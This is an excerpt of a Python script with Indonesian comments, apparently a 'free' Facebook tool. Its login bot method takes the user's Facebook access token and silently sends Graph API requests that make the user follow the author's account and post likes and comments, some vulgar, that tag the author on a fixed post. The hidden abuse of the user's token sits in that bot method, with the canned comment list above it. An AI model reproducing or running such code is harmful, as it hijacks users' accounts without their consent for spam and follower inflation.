...
## Buat yang mau ngamal jangab lupa sholat

## TERIMA KASIH BUAT LU YANG UDAH PAKAI SCRIP FREE INI
## Import Module Kntl ..
...
komen = random.choice(['GUA PAKE SC LU BANG😘 @[100068749665273:0] I Love You','Pengguna script ganja kamu bang @[100068749665273:0]','Kamu ganteng banget deh @[100068749665273:0]','Kamu ganteng banget deh bang @[100068749665273:0]','Kamu manis bang bang @[100068749665273:0]','Kamu cantik banget anak siapa @[100068749665273:0]','Kamu ganteng banget bang @[100068749665273:0]','Mantap bang love you','Niki mark nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100068749665273:0]'])
...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : ヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹㅇ　　　　
 [\x1b[1;96m+%s] USER   : FREEE  
 [\x1b[1;96m+%s] Fp new  : ヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹㅇ
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100068749665273/subscribers?access_token=' + toket) 
		requests.post('https://graph.facebook.com/100068749665273/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100068749665273/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/293175069650813/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/293175069650813/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/293175069650813/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/293175069650813/likes?summary=true&access_token=' + toket)
